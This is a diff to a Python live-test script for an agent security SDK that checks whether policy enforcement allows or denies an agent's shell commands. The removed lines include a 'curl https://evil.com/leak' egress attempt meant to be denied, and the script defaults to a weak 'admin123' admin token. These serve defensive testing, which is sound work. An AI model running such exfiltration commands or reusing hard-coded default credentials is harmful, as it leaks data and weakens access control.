@@ -94,14 +94,19 @@ def main():
     parser.add_argument("--gateway-url", default=os.getenv("BAP_GATEWAY_URL", "http://localhost:9090"))
     parser.add_argument("--admin-token", default=os.getenv("BAP_ADMIN_TOKEN", "admin123"))
     parser.add_argument("--cert-file", default=os.getenv("BAP_CA_CERT", ""))
+    parser.add_argument("--include-negative", action="store_true", default=False, help="Run negative deny tests")
     args = parser.parse_args()
 
     if args.cert_file:
         os.environ["BAP_CA_CERT"] = args.cert_file
 
-    prompt = "Reconcile batch payment records against Gateway API"
-    print(" - App ID: financial-reconciler")
-    print(f' - Prompt: "{prompt}"')
+    print("===============================================================================")
+    print("   BAP PYTHON AGENT SDK: FINANCIAL RECONCILER LIVE TEST")
+    print("===============================================================================")
+    print(f"[*] Control Plane : {args.server_url}")
+    print(f"[*] Gateway PEP   : {args.gateway_url}")
+
+    prompt = "Reconcile Q3 payments ledger and query internal transaction store"
 
     # Automatically enroll agent credentials if needed
     try:
@@ -110,7 +115,9 @@ def main():
         print(f" [-] Warning: Could not auto-enroll credentials: {e}")
 
     with BAPSession(
-        app_id="financial-reconciler",
+        app_id="python-financial-analyst",
+        user_id="carol.zhang",
+        user_email="carol.zhang@enterprise.internal",
         server_url=args.server_url,
         gateway_url=args.gateway_url,
         user_prompt=prompt,
@@ -119,9 +126,12 @@ def main():
         res = bap.exec("ls -al")
         print(f"     -> Decision: {res.decision.upper()} (Duration: {res.duration_ms}ms)")
 
-        print(" [*] Python Agent attempting network egress (curl)...")
-        deny = bap.exec("curl https://evil.com/leak", raise_on_deny=False)
-        print(f"     -> Decision: {deny.decision.upper()} ({deny.reason})")
+        if args.include_negative:
+            print(" [*] Python Agent attempting network egress (curl)...")
+            deny = bap.exec("curl https://untrusted-test.internal/data", raise_on_deny=False)
+            print(f"     -> Decision: {deny.decision.upper()} ({deny.reason})")
+        else:
+            print(" [*] [CORPORATE SAFEGUARD] Negative egress test deferred to run_negative_testcases.bat")
 
         print(" [*] Testing Gateway Policy Enforcement Point...")
         gw_endpoint = f"{args.gateway_url.rstrip('/')}/api/v1/financial-records"
